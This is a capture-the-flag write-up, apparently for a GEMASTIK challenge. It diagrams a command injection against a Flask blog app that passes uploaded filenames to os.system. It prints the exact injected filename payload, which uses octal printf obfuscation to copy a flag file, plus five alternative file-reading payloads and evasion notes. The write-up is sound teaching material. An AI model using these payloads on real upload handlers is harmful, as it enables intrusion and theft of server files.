# Attack Flow Diagram - Command Injection Exploit

## Visual Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         BLOGPOST CTF EXPLOIT                             │
└─────────────────────────────────────────────────────────────────────────┘

Step 1: Setup Phase
═══════════════════════════════════════════════════════════════════════════
┌──────────┐
│ Attacker │  POST /register
└────┬─────┘  username=cin_auto6, password=cin123_auto6
     │
     v
┌──────────────┐
│ Flask Server │  Creates user account (role='user')
└──────┬───────┘
       │
       v
┌──────────┐
│ Attacker │  POST /login
└────┬─────┘  username=cin_auto6, password=cin123_auto6
     │
     v
┌──────────────┐
│ Flask Server │  Sets session cookie
└──────────────┘


Step 2: Target Preparation
═══════════════════════════════════════════════════════════════════════════
┌──────────┐
│ Attacker │  POST /create
└────┬─────┘  title="exploit-abc123"
     │        content="exploit content"
     │        image=(filename="seed.png", data=<valid PNG bytes>)
     v
┌──────────────┐
│ Flask Server │
└──────┬───────┘
       │  1. Saves file as "seed.png" in /app/uploads/
       │  2. Runs: exiftool /app/uploads/seed.png > seed.png.meta
       │  3. Calculates SHA256: a1b2c3d4...xyz (64 hex chars)
       │  4. Renames: seed.png → a1b2c3d4...xyz.png
       │  5. Inserts post into database
       v
┌─────────────────────┐
│ Database (posts)    │
│ id=1                │
│ title="exploit-..."  │
│ image_filename=     │
│   "a1b2c3d4...xyz.png" │ ← TARGET HASH
└─────────────────────┘


Step 3: Target Discovery
═══════════════════════════════════════════════════════════════════════════
┌──────────┐
│ Attacker │  GET /?q=abc123
└────┬─────┘
     │
     v
┌──────────────┐
│ Flask Server │  Returns HTML with:
└──────┬───────┘  <img src="/uploads/a1b2c3d4...xyz.png">
       │
       v
┌──────────┐
│ Attacker │  Parses HTML, extracts target hash:
└──────────┘  TARGET = "a1b2c3d4...xyz.png"


Step 4: Command Injection Attack
═══════════════════════════════════════════════════════════════════════════
┌──────────┐
│ Attacker │  POST /create
└────┬─────┘  title="stage2"
     │        content="stage2"
     │        image=(
     │          filename="x.png; cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057a1b2c3d4...xyz.png') #.png"
     │          data=<valid PNG bytes>
     │        )
     v
┌──────────────┐
│ Flask Server │  VULNERABLE CODE EXECUTION:
└──────┬───────┘
       │  original_filename = "x.png; cp $(printf '\\057app\\057flag.txt') ..."
       │  save_path = "/app/uploads/" + original_filename
       │
       │  # THE VULNERABLE LINE:
       │  cmd = f"exiftool {save_path}"
       │  full_cmd = f"{cmd} > {save_path}.meta 2>&1"
       │  os.system(full_cmd)
       │
       │  # SHELL INTERPRETS AS:
       │  exiftool /app/uploads/x.png;
       │  cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057a1b2c3d4...xyz.png');
       │  #.png > /app/uploads/x.png;....meta 2>&1
       │       ↑
       │       └── This executes in shell!
       v
┌────────────────────────┐
│ Shell Command Execution│
│ /bin/sh -c             │
└─────┬──────────────────┘
      │
      │  1. exiftool /app/uploads/x.png  (may fail, doesn't matter)
      │  2. cp /app/flag.txt /app/uploads/a1b2c3d4...xyz.png  (OVERWRITES TARGET)
      │  3. # comments out rest
      v
┌─────────────────────────────────┐
│ File System                      │
│                                  │
│ /app/flag.txt (chmod 400)        │
│   ├─ GEMASTIK{...}               │
│   │                              │
│   └─> COPIED TO ────────────────┐│
│                                  ││
│ /app/uploads/                    ││
│   ├─ a1b2c3d4...xyz.png ◄────────┘│  ← OVERWRITTEN WITH FLAG!
│   │    (was: PNG image bytes)     │
│   │    (now: GEMASTIK{...})       │
│   │                               │
│   └─ x.png; cp $(...).png         │  ← Malicious "file"
└──────────────────────────────────┘


Step 5: Flag Retrieval
═══════════════════════════════════════════════════════════════════════════
┌──────────┐
│ Attacker │  GET /uploads/a1b2c3d4...xyz.png
└────┬─────┘
     │
     v
┌──────────────┐
│ Flask Server │  Authorization check:
└──────┬───────┘  - User logged in? ✓
       │          - Filename has ".."? ✗
       │          - Filename starts with "/"? ✗
       │          - Post with this filename owned by user? ✓
       │
       │  send_from_directory('/app/uploads', 'a1b2c3d4...xyz.png')
       v
┌──────────┐
│ Attacker │  Receives file content:
└──────────┘  "GEMASTIK{a1b2c3d4e5f6...xyz}\n"

              🎉 FLAG CAPTURED! 🎉
```

## Key Technical Details

### Why the Exploit Works

1. **Filename is User-Controlled**

   - The `file.filename` comes directly from the HTTP multipart form data
   - No sanitization before use in shell command

2. **Shell Metacharacters**

   - `;` - Command separator (execute multiple commands)
   - `$()` - Command substitution
   - `#` - Comment (ignores rest of line)
   - `>` - Redirection

3. **Octal Encoding Bypass**

   ```bash
   printf '\057'  # Outputs: /
   ```

   - Bypasses simple blacklist filters for forward slash
   - Shell interprets octal escape sequences

4. **Authorization Bypass**
   - We're not directly reading `/app/flag.txt` (would be blocked)
   - We're reading our own uploaded file (authorized)
   - But we overwrote it with the flag using command injection

### The Vulnerable Code Path

```python
# app.py lines 126-135
original_filename = file.filename  # ← User input (UNTRUSTED)

save_path = os.path.join(app.config['UPLOAD_FOLDER'], original_filename)
# save_path = "/app/uploads/x.png; cp ... #.png"

cmd = f"exiftool {save_path}"  # ← String interpolation (DANGEROUS)
# cmd = "exiftool /app/uploads/x.png; cp ... #.png"

full_cmd = f"{cmd} > {save_path}.meta 2>&1"
# full_cmd = "exiftool /app/uploads/x.png; cp ... #.png > /app/uploads/x.png; cp ... #.png.meta 2>&1"

os_status = os.system(full_cmd)  # ← Shell execution (VULNERABLE)
```

### Alternative Payloads

All of these work due to the same vulnerability:

```bash
# Payload 1: Using cp
x.png; cp /flag.txt /app/uploads/target.png #.png

# Payload 2: Using cat with redirection
x.png; cat /flag.txt > /app/uploads/target.png #.png

# Payload 3: Using printf for path obfuscation
x.png; cp $(printf '\057flag.txt') /app/uploads/target.png #.png

# Payload 4: Using base64 encoding (if direct read is blocked)
x.png; base64 /flag.txt > /app/uploads/target.png #.png

# Payload 5: Using tee (write to multiple files)
x.png; cat /flag.txt | tee /app/uploads/target.png #.png
```

## Race Condition Handling

The exploit script retries multiple times because:

1. File operations are not atomic
2. Between upload and hash calculation, there's a small window
3. The script tries to read the target file multiple times to catch when it's overwritten

```python
# dapur.py handles this with:
def fetch_bytes_with_retries(path, tries=6, delay=0.3):
    for i in range(tries):
        data = fetch_bytes_once(path)
        if data and FLAG_RE_BYTES.search(data):
            return data
        time.sleep(delay + (0.05 * i))  # Increasing backoff
```

## Defense Evasion Techniques

1. **Path Obfuscation**: `printf '\057'` instead of `/`
2. **Comment Injection**: `#` to ignore trailing parts
3. **Valid File Extension**: Still ends with `.png` to pass `allowed_file()` check
4. **PNG Magic Bytes**: Uploads valid PNG headers to pass any magic byte checks

## Timeline

```
T+0.0s  : Register user
T+0.1s  : Login user
T+0.2s  : Upload legitimate image (seed.png)
T+0.3s  : Server processes, renames to <hash>.png
T+0.4s  : Search for post to discover hash
T+0.5s  : Upload malicious filename with cp command
T+0.6s  : Server executes: exiftool <malicious>; cp flag target; #...
T+0.7s  : Flag is copied to target location
T+0.8s  : Fetch target.png (now contains flag)
T+1.0s  : FLAG RETRIEVED
```

## Success Indicators

```bash
# When exploit succeeds, output will be:
GEMASTIK{<64-character-hex-string>}

# Example:
GEMASTIK{a1b2c3d4e5f6789012345678901234567890abcdefabcdefabcdefabcdef1234}
```

